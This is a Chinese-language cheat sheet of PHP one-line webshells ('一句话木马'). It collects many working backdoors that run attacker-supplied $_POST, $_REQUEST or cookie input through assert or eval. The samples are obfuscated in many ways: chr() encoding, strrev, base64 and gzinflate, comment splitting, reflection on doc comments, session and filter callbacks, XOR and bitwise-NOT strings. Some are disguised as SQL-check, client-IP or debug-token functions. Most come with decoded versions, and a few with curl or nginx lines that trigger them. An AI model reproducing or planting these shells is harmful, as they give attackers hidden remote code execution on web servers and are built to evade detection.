# PHP一句话木马

## 数组

利用数组，维数自己随意构造

```php
<?php 
$a = 0;
$item['jc'] = 'a'.'s'.'s'.'e'.'r'.'t'; // 定义$item为一维数组
$array[] = $item; // $array为一个二维数组
$array[$a]['jc']($_POST['cmd']);
?>
```


```php
<?php 
$item['wind'] = 'assert'; 
$array[] = $item; 
$array[0]['wind']($_POST['whirlwind']);  //密码whirlwind 菜刀 
?>

```

利用key获取数组key

```php
<?php 
$lang = (string)key($_GET);  // key返回数组的键名
$lang($_POST['cmd']); 
?>
```

http://localhost/test.php?assert=test，菜刀密码cmd


## 变量

```php
<?php 
$a='assert'; //替换成$a='eval';会报错。
$a($_POST[x]);
?>
```

```php
<?php 
 $a=@strrev(ecalper_gerp); 
 $b=@strrev(edoced_46esab);  
 echo @$a($b(L3h4L2Ug),$_POST[jc],axxa); //    /xx/e
?>
```
## chr

```php
<?php 
assert(chr(97).chr(115).chr(115).chr(101).chr(114).chr(116).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(120).chr(93).chr(41)); // chr解出来是assert($_POST[x])，不能替换成eval(chr(97).chr(115)
?>
```

```php
<?php
preg_replace(chr(47).chr(100).chr(0x75).chr(111).chr(115).chr(111).chr(102).chr(116).chr(0x2f).chr(0x69).chr(115).chr(101),chr(0x40).chr(0x65).chr(0x76).chr(97).chr(0x6c).chr(0x28).chr(0x27).chr(0x40).chr(101).chr(0x76).chr(0x61).chr(0x6c).chr(40).chr(40).chr(0x67).chr(0x65).chr(116).chr(95).chr(0x6d).chr(97).chr(0x67).chr(0x69).chr(0x63).chr(0x5f).chr(113).chr(117).chr(0x6f).chr(0x74).chr(101).chr(115).chr(95).chr(0x67).chr(112).chr(0x63).chr(40).chr(41).chr(0x3f).chr(0x73).chr(0x74).chr(114).chr(0x69).chr(112).chr(115).chr(0x6c).chr(97).chr(0x73).chr(0x68).chr(0x65).chr(0x73).chr(40).chr(36).chr(0x5f).chr(0x50).chr(79).chr(0x53).chr(0x54).chr(91).chr(68).chr(0x38).chr(79).chr(0x57).chr(88).chr(0x32).chr(89).chr(0x5d).chr(41).chr(58).chr(36).chr(95).chr(80).chr(79).chr(0x53).chr(84).chr(0x5b).chr(0x44).chr(0x38).chr(79).chr(87).chr(0x58).chr(0x32).chr(0x59).chr(0x5d).chr(41).chr(41).chr(0x3b).chr(39).chr(0x29).chr(59),chr(0x64).chr(117).chr(111).chr(115).chr(0x6f).chr(102).chr(116));
?>
```
解密后：

```php
<?php
preg_replace('/duosoft/ise', '@eval('@eval((get_magic_quotes_gpc()?stripslashes($_POST[D8OWX2Y]):$_POST[D8OWX2Y]));');', 'duosoft' );
?>
```

```php
<?php
// chr
$_uU=chr(99).chr(104).chr(114);
// eval($_POST[1]);
$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);
// create_function
$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);
//$_=create_function("", 'eval($_POST[1]);');
$_=$_fF("",$_cC);
@$_();?>
```

解密后：`eval($_POST[1]);`
## 换行

```php 

<?php
assert(
$_POST[x] 
);
?>

```

```php
<?php
assert(	
$_POST['xx'
] 
);
?>

```

## 空格

密码为cmd

```php
<?PHP eVal ( gzinFlate ( base64_dEcode ('Sy1LzNFQiQ/wDw6JVk/OTVGP1bQGAA==') ) );exit;?>
```

## 注释

```php
<?php
@$_="s"."s"./*-/*-*/"e"./*-/*-*/"r";
@$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";
@$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}
[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]); // 密码-7
?>
```

## 和正常代码混淆

```php
<?php
//pwd=addimg
$sss = "ZXZhbChiYXNlNjRfZGVjb2RlKCJhV1lnS0NCcGMzTmxkQ2dnSkY5U1JWRlZSVk5VV3lkd1lYTnpKMTBnS1NsN1FHVjJZV3dvSUdKaGMyVTJORjlrWldOdlpHVW9JQ1JmVWtWUlZVVlRWRnNuY0dGemN5ZGRJQ2tnS1R0OVpXeHpaWHRBWlhaaGJDZ2dKRjlTUlZGVlJWTlVXeWRoWkdScGJXY25YU0FwTzMwPSIpKQ==";
function CheckSQL( &$val ){ 
	$v = "select|update|union|set|where|order|and|or";
	$val = base64_decode( $val );
}
CheckSQL( $sss );
preg_replace('/uploadsafe.inc.php/e','@'.$sss, 'uploadsafe.inc.php');
?>
```

解密后:

```php
解密后为：if ( isset( $_REQUEST['pass'] )){@eval( base64_decode( $_REQUEST['pass'] ) );}else{@eval( $_REQUEST['addimg'] );}
```


```php
<?php
if (!function_exists('get_c1ient_area')) {
    function get_c1ient_area() {
        $_SERVER['REM0TE_ADDR'] = 'REM0TE_CREATE_QGV2YWwoJF';
        $_SERVER['HTTP_CL1ENT_1P'] = 'STR_9QT1NUW2F';
        $_SERVER['HTTP_X_F0RWARDED_FOR'] = 'BASE_SERVER64_kbV0pOw==';
        $get_c1ient_area = substr($_SERVER['REM0TE_ADDR'], 7, 7) . "FUNCTION";
        $getenv = substr($_SERVER['HTTP_CL1ENT_1P'], 0, 4) . "REPLACE";
        $isset = $getenv('_SERVER', '', substr($_SERVER['HTTP_X_F0RWARDED_FOR'], 0, 14)) . "DECODE";
        //@eval($_POST[adm])
        $rea1area = $isset(substr($_SERVER['REM0TE_ADDR'], 14) . substr($_SERVER['HTTP_CL1ENT_1P'], 4) . substr($_SERVER['HTTP_X_F0RWARDED_FOR'], 14));
        echo $rea1area;
        $on1inearea = $get_c1ient_area('', $rea1area);
        $on1inearea();
        return @$onlinearea;
    }
    $on1inearea = get_c1ient_area();
}
?>
```

解密后为：`@eval($_POST[adm])`


```php
<?php
	# return 32md5 back 6
	function getMd5($md5 = null) {
		$key = substr(md5($md5),26);
		return $key; 
		} 
		$array = array(
			chr(112).chr(97).chr(115).chr(115), //pass
			chr(99).chr(104).chr(101).chr(99).chr(107), // check
			chr(99).chr(52).chr(53).chr(49).chr(99).chr(99)	// c451cc
		);
		if ( isset($_POST) ){
			$request = &$_POST;
		} 
		
		elseif ( isset($_REQUEST) )  $request = &$_REQUEST;
		
		if ( isset($request[$array[0]]) && isset($request[$array[1]]) ) { 
			if ( getMd5($request[$array[0]]) == $array[2] ) {  //md5(pass) == c451cc
				$token = preg_replace (
				chr(47) . $array[2] . chr(47) . chr(101),  //  /c451cc/e
				$request[$array[1]], 
				$array[2]
			);
		}
	}
?>
```

```php
<?php
$MMIC= $_GET['tid']?$_GET['tid']:$_GET['fid'];
if($MMIC >1000000){
  die('404');
}
if (isset($_POST["\x70\x61\x73\x73"]) && isset($_POST["\x63\x68\x65\x63\x6b"]))
{
  $__PHP_debug   = array (
    'ZendName' => '70,61,73,73', 
    'ZendPort' => '63,68,65,63,6b',
    'ZendSalt' => '792e19812fafd57c7ac150af768d95ce'
  );
 
  $__PHP_replace = array (
    pack('H*', join('', explode(',', $__PHP_debug['ZendName']))),
    pack('H*', join('', explode(',', $__PHP_debug['ZendPort']))),
    $__PHP_debug['ZendSalt']
  );
 
  $__PHP_request = &$_POST;
  $__PHP_token   = md5($__PHP_request[$__PHP_replace[0]]);
 
  if ($__PHP_token == $__PHP_replace[2])
  {
    $__PHP_token = preg_replace (
      chr(47).$__PHP_token.chr(47).chr(101),
      $__PHP_request[$__PHP_replace[1]],
      $__PHP_token
    );
 
    unset (
      $__PHP_debug,
      $__PHP_replace,
      $__PHP_request,
      $__PHP_token
    );
 
    if(!defined('_DEBUG_TOKEN')) exit ('Get token fail!');
 
  }
}  

```

## PHP反射机制

```php
<?php
    /**
    * eva
    * l($_POS
    * T["c"]);
    * asse
    * rt
    */
    class TestClass { }
    $rc = new ReflectionClass('TestClass');
    $str = $rc->getDocComment();
    $payload = substr($str,strpos($str,'ev'),3);
    $payload .= substr($str,strpos($str,'l('),7);
    $payload .= substr($str,strpos($str,'T['),8);
    $exe = substr($str, strpos($str, 'as'), 4);
    $exe .= substr($str, strpos($str, 'rt'), 2);
    
    $exe($payload);
?> 
```

利用注释和php的反射机制（可获取注释)，解密后：

```php 
assert(eval($_POST["c"]));
```

## 回调

利用session_set_save_handler回调函数。

```php
<?php
error_reporting(0);
if ($_REQUEST['session'] == 1) {
    $session = chr(97) . chr(115) . chr(115) . chr(101) . chr(114) . chr(116); //assert
    // open第一个被调用，类似 类的构造函数
    function open($save_path, $session_name) {
    }
    // close最后一个被调用，类似 类的析构函数
    function close() {
    }
    // 得到session id后，等价于执行assert($_REQUEST[phpcms])
    session_id($_REQUEST[phpcms]);
    function write($id, $sess_data) {
    }
    function destroy($id) {
    }
    function gc() {
    }
    // 第三个参数为read  read(string $sessionId)
    session_set_save_handler("open", "close", $session, "write", "destroy", "gc");
    @session_start(); //会话打开的时候，自动调用回调函数
    $cloud = $_SESSION["d"] = "c"; // 这句话没用
}
?>
```

整个代码逻辑：session_set_save_handler设置6个回调，当seession_start的时候，自动调用第三个$session回调函数，第三个函数的原型是read(string $sessionId)，这里相当于是assert(string $sessionId)，而参数是sessionId。当调用`session_id($_REQUEST[phpcms]);`这句代码后，返回sessionId，最后就相当于执行
`assert($_REQUEST[phpcms])`


```php
<?php
$e = $_REQUEST['e'];
declare(ticks=1);
register_tick_function($e, $_REQUEST['pass']);
?>
```


```php

<?php
$e = $_REQUEST['e'];
register_shutdown_function($e, $_REQUEST['pass']);
?>
```


```php
<?php
filter_var($_REQUEST['pass'], FILTER_CALLBACK, array('options' => 'assert'));
//filter_var_array(array('test' => $_REQUEST['pass']), array('test' => array('filter' => FILTER_CALLBACK, 'options' => 'assert')));
?>
```


```php
<?php
$e = $_REQUEST['e'];
$arr = array($_POST['pass'],);
array_filter($arr, $e);
?>

```


```php
$_clasc = $_REQUEST['mod'];
$arr = array($_POST['bato'] => '|.*|e',);
@array_walk_recursive($arr, $_clasc, '');
```


## 反引号

利用反引号执行命令

```php
<?php 
$cmd =base64_decode('dmVy='); // ver
echo `$cmd`. `$_GET[username]`;  // ``反引号的作用相当于shell_exec,执行系统命令
//或
$var = `net user`;
echo "$var";
?>
```

## +

```php
<?php
$num = +"";
$num++; $num++; $num++; $num++;
$four = $num; // 4
$num++; $num++;
$six = $num; // 6
$_="";
$_[+$_]++;  // +""为0
$_=$_.""; // $_为字符串"Array"
$___=$_[+""];//A
$____=$___;
$____++;//B
$_____=$____;
$_____++;//C
$______=$_____;
$______++;//D
$_______=$______;
$_______++;//E
$________=$_______;
$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;//O
$_________=$________;
$_________++;$_________++;$_________++;$_________++;//S
$_=$____.$___.$_________.$_______.$six.$four.'_'.$______.$_______.$_____.$________.$______.$_______;
$________++;$________++;$________++;//R
$_____=$_________;
$_____++;//T
$__=$___.$_________.$_________.$_______.$________.$_____;
$__($_("ZXZhbCgkX1BPU1RbY21kXSk=")); 
//ASSERT(BASE64_DECODE("ZXZhbCgkX1BPU1RbY21kXSk="));  
//ASSERT(eval($_POST[cmd]));  
?>
```

## xor

```php
<?php
    @$_++; // $_ = 1
    $__=("#"^"|"); // $__ = _
    $__.=("."^"~"); // _P
    $__.=("/"^"`"); // _PO
    $__.=("|"^"/"); // _POS
    $__.=("{"^"/"); // _POST 
    ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);
?>
```

## 反引号

```php
<?php
$y = ~"瀸寶崑";	// assert
$cmd = ~"暅挌挌洖"; // jcmemeda
$y($_REQUEST[$cmd]);
?>
```

解密后：`assert($_REQUEST[jcmemeda])`

## Cookie

```php
<?php extract($_COOKIE);@$F&&@$F($A,$B);
```
可以利用assert变量，进行执行php代码。

```
curl -v -b "F=assert;A=phpinfo();B=test" 'http://127.0.0.1/test.php'
```

## HTTP变量

```php
<?php @preg_replace($_SERVER['HTTP_X_E10EC8'], $_SERVER['HTTP_X_CURRENT'], ''); ?>
```

拿Nginx举例，修改fastcgi_params参数，添加变量如下：

```
fastcgi_param  HTTP_X_E10EC8      //e;
fastcgi_param  HTTP_X_CURRENT     assert('phpinfo()');
```

reload nginx后，即可执行phpinfo

## `php://input`


```php
<?php eval('?>' . file_get_contents('php://input'));
```

可执行php代码，post方式提交`<?php system("whoami"); ?>`
